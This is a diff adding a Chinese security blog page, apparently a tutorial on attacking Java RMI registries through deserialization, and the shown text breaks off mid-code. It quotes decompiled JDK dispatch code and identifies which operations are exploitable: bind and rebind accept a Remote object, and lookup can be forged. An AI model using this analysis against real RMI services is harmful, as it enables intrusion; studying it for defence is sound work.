@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Chiexf">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/09/30/java安全/rmi(二)—攻击/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="0x01 RMI反序列化攻击RMI交互方式在RMI过程中，常常会涉及到以下5个交互方式，这几种方法位于RegistryImpl_Skel.dispatch()中，每种方式对应的case如下  0-&gt;bind 1-&gt;list 2-&gt;lookup 3-&gt;rebind 4-&gt;unbind  list该方法用来列出Registry上绑定的远程对象 但是没有**readObje">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RMI(二)-攻击">
+<meta property="og:url" content="http://example.com/2023/09/30/Java%E5%AE%89%E5%85%A8/RMI(%E4%BA%8C)%E2%80%94%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x01 RMI反序列化攻击RMI交互方式在RMI过程中，常常会涉及到以下5个交互方式，这几种方法位于RegistryImpl_Skel.dispatch()中，每种方式对应的case如下  0-&gt;bind 1-&gt;list 2-&gt;lookup 3-&gt;rebind 4-&gt;unbind  list该方法用来列出Registry上绑定的远程对象 但是没有**readObje">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-09-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-19T13:22:33.221Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="RMI">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/1.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            RMI(二)-攻击 -
+        
+        Chiexf&#39;blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Chiexf' Blog","subtitle":{"text":["好好学习，天天向上！！！","CTRL + CV player~"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/Chiexf","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.3.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"path":"/about","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":false}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"info","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+    
+
+    
+
+    <div class="main-content-container">
+        
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Chiexf&#39;blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                        标签
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        分类
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/about"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        关于
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/tags"  >
+                             
+                                
+                                标签
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                分类
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/about"  >
+                             
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                关于
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">RMI(二)-攻击</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/1.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Chiexf</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-09-30</span>
+        <span class="mobile">2023-09-30</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-10-19 21:22:33</span>
+            <span class="mobile">2023-10-19 21:22:33</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/RMI/">RMI</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="0x01-RMI反序列化攻击"><a href="#0x01-RMI反序列化攻击" class="headerlink" title="0x01 RMI反序列化攻击"></a>0x01 RMI反序列化攻击</h1><h2 id="RMI交互方式"><a href="#RMI交互方式" class="headerlink" title="RMI交互方式"></a>RMI交互方式</h2><p>在RMI过程中，常常会涉及到以下5个交互方式，这几种方法位于<code>RegistryImpl_Skel.dispatch()</code>中，每种方式对应的case如下</p>
+<ul>
+<li>0-&gt;bind</li>
+<li>1-&gt;list</li>
+<li>2-&gt;lookup</li>
+<li>3-&gt;rebind</li>
+<li>4-&gt;unbind</li>
+</ul>
+<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>该方法用来列出Registry上绑定的远程对象</p>
+<p>但是没有**readObject()**，所以无法利用</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var97 = var6.list();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="lookup"><a href="#lookup" class="headerlink" title="lookup"></a>lookup</h3><p>该方法用于获取Registry上的一个远程对象</p>
+<p>存在<strong>readObject()<strong>，不过必须为</strong>String</strong>类，不能直接利用，但是可以伪造请求连接</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><p>该方法用来在<strong>Registry</strong>上绑定一个远程对象</p>
+<p>存在<strong>readObject()<strong>，且需要为</strong>String</strong>和<strong>Remote</strong>类对象，所以我们可以将<strong>Object</strong>强转为<strong>Remote</strong>类型来利用</p>
+<p>如果在服务端安装了存在反序列化漏洞的相关组件，那么我们就有机会利用</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="rebind"><a href="#rebind" class="headerlink" title="rebind"></a>rebind</h3><p>与<strong>bind</strong>方法类似</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="unbind"><a href="#unbind" class="headerlink" title="unbind"></a>unbind</h3><p>与<strong>lookup</strong>方法类似</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">                var6.unbind(var7);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> 